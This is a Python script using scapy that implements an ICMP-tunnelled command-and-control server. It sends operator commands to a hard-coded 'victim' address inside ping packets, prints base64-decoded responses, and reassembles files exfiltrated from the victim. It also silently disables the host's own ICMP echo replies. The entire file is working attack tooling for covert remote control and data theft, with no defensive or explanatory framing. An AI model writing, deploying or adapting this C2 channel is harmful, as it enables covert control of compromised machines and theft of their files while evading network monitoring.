import base64
import threading
import time
import os
from scapy.all import IP, ICMP, Raw, send, sniff, sr

# Victim IP address
VICTIM_IP = "10.10.1.149"
FILE_CHUNK_SIZE = 1400  # Max data size per packet
IFACE = "ens5"


def send_command(command_str):
    """Send a command to the victim inside an ICMP packet."""
    try:
        icmp_packet = IP(dst=VICTIM_IP) / ICMP(type=8) / Raw(load=command_str.encode())
        sr(icmp_packet, timeout=0, verbose=0)  # fire & wait just for ARP/MAC resolution
        print(f"[*] Command sent: '{command_str}'")
        time.sleep(0.5)
    except Exception as e:
        print(f"[-] Error sending command: {e}")


def sniffer():
    """Background thread: listens for victim responses and prints them."""
    def handle(pkt):
        if pkt.haslayer(ICMP) and pkt[ICMP].type == 0 and pkt[IP].src == VICTIM_IP:
            data = pkt[Raw].load
            if Raw in pkt:
                data = pkt[Raw].load

                if data.startswith(b"END_OF_FILE"):
                    return  
                
                try:
                    # Decode from base64
                    decoded = base64.b64decode(data).decode("utf-8", errors="ignore")
                    print(f"\n[+] Response from victim:\n{decoded}")
                except Exception as e:
                    print(f"\n[+] Raw response: {data} (decode error: {e})")

    sniff(
        prn=handle,
        filter=f"icmp",
        iface=IFACE,
        store=False
    )


def receive_response_file():
    """Receives and reconstructs a base64-encoded file from the victim."""
    print("[*] Waiting for file data...")
    chunks = b""
    is_done = False

    while not is_done:
        pkt = sniff(count=1, filter=f"icmp and src host {VICTIM_IP}", iface=IFACE, timeout=10)
        if not pkt or Raw not in pkt[0]:
            print("[-] Timeout while receiving file.")
            return None

        data = pkt[0][Raw].load
        if data.startswith(b"END_OF_FILE"):
            is_done = True
        else:
            chunks += data

    return chunks


def handle_file_transfer():
    """Handles file transfer from victim (base64 decoded)."""
    file_data_b64 = receive_response_file()
    if file_data_b64:
        filename = input("[?] Enter filename to save: ")
        try:
            file_data = base64.b64decode(file_data_b64)
            with open(filename, "wb") as f:
                f.write(file_data)
            print(f"[+] File '{filename}' saved successfully!")
        except Exception as e:
            print(f"[-] Error saving file: {e}")


if __name__ == "__main__":
    # Start sniffer thread
    os.system('echo "1" >  /proc/sys/net/ipv4/icmp_echo_ignore_all')
    threading.Thread(target=sniffer, daemon=True).start()

    print("[*] C&C server started.")
    while True:
        try:
            cmd = input("C2> ").strip()
            if not cmd:
                continue
            if cmd == "exit":
                break

            if cmd.startswith("send_file "):
                send_command(cmd)
                handle_file_transfer()
            else:
                send_command(cmd)

        except KeyboardInterrupt:
            print("\n[+] Exiting.")
            break
